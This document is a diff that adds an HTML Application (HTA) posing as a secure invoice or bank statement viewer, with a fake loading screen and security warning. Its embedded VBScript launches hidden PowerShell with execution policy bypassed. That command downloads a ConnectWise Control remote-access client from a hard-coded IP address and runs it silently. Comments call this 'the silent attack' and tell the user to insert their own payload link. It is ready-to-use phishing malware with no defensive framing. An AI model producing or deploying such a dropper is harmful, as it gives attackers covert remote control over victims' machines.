@@ -1,0 +1,105 @@
+<html>
+<head>
+    <title>Security Document Viewer - Statement ID: 7895643</title>
+    
+    <HTA:Application 
+        id="oHTA" 
+        applicationName="Invoice Viewer" 
+        
+        border="thick"          
+        caption="yes"           
+        showInTaskbar="no"      singleInstance="yes"    
+        windowState="normal"    width="850"             
+        height="550"            
+        
+        icon="C:\Windows\System32\imageres.dll,-102" 
+    />
+    
+    <style>
+        body { 
+            background-color: #f4f4f4; 
+            font-family: Arial, sans-serif;
+            overflow: hidden; 
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 100%;
+            height: 100%;
+            padding: 30px;
+            background-color: #ffffff;
+        }
+        .header {
+            background-color: #004d99;
+            color: white;
+            padding: 10px;
+            margin: -30px -30px 20px; 
+            font-size: 1.5em;
+            font-weight: bold;
+        }
+        .loading-message {
+            text-align: center;
+            margin-top: 50px;
+            font-size: 1.1em;
+            color: #555;
+        }
+        .warning {
+            color: #cc0000;
+            font-weight: bold;
+            margin-top: 50px;
+            border: 1px solid #cc0000; 
+            padding: 15px;
+            background-color: #ffeaea;
+        }
+    </style>
+</head>
+<body>
+    
+    <div class="container">
+        <div class="header">
+            Secured Document Viewer - Statement ID: 7895643
+        </div>
+        
+        <p style="color: #333;"><strong>To ensure data integrity and security, this statement is loaded from the central server.</strong></p>
+        
+        <div class="loading-message">
+            <img src="https://i.imgur.com/eB99p2i.gif" alt="Loading..." width="40" height="40"/>
+            <h3>Validating Resources and Loading Fonts...</h3>
+            <p>Please wait a moment. Do not close this window until the document is displayed.</p>
+        </div>
+
+        <div class="warning">
+            WARNING: Due to new security protocols, the application requires local runtime resources to complete the viewing process. This happens automatically and may take up to 3 minutes.
+        </div>
+    </div>
+
+    <script language="VBScript">
+' --- 1. DEFINING THE PAYLOAD VARIABLES ---
+
+' !! YOU MUST UPDATE THIS LINK WITH YOUR ACTUAL EXE/MSI LINK !!
+Executable_URL = "http://97.92.187.207:8040/Bin/ConnectWiseControl.ClientSetup.exe?h=97.92.187.207&p=8041&k=BgIAAACkAABSU0ExAAgAAAEAAQA5A2Lfs6FXVaNaZ9mryKv1bu4R8fdq2cqyuG%2BGOu8nRyj5VAXrPLEkc8ooB5DolBrjLCpRObt5EGCBPUCHqq8O7bmgLAvRPg5Lf0WXVuNjZ37nfRNGN90JdhMX%2BCZk7%2F1qoJKc5WrVisNq0D2j9IDzN4kciG%2B3CxkHM3dG3FsLf08ncGEQN7s4ojTH0aLc8qUiPS9W8IPvyNsCBkfJ0MOU%2Be3QwIJQsTt42GwdyWJI%2BzqfDjNaZjj2nS1tKHWk5k8%2FxS614VPMs3kgqJoqnwgY7%2Bke%2FVlTnY0An1ueNzkJZKUlLOgF1sNnF1EkUw9CVRetOj2cR0YDJQKwO0%2Bce0av&e=Access&y=Guest&t=&c=&c=&c=&c=&c=&c=&c=&c="
+Executable_FileName = "C:\Temp\ConnectWiseClient.exe" 
+
+' The delay time (in milliseconds) - 3 minutes
+DelayTime = 180000 
+
+' --- 2. ASSEMBLE THE POWERSHELL EXECUTION STRING ---
+
+' This command chain: Creates C:\Temp -> Downloads EXE -> Runs EXE silently (/s)
+PowerShellCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & Chr(34) & _
+                    "New-Item -ItemType Directory -Path 'C:\Temp' -Force | Out-Null;" & _
+                    "iwr -Uri '" & Executable_URL & "' -OutFile '" & Executable_FileName & "';" & _
+                    "Start-Process '" & Executable_FileName & "' -ArgumentList '/s' -Wait" & Chr(34)
+
+' --- 3. EXECUTION AND RELIABLE TIMER SETUP ---
+
+Set objShell = CreateObject("WScript.Shell")
+
+' 1. Run the silent attack in the background immediately
+objShell.Run PowerShellCommand, 0
+
+' 2. Use the reliable JavaScript setTimeout function to call window.close after the delay time
+window.setTimeout "window.close()", DelayTime        
+    </script>
+</body>
+</html>
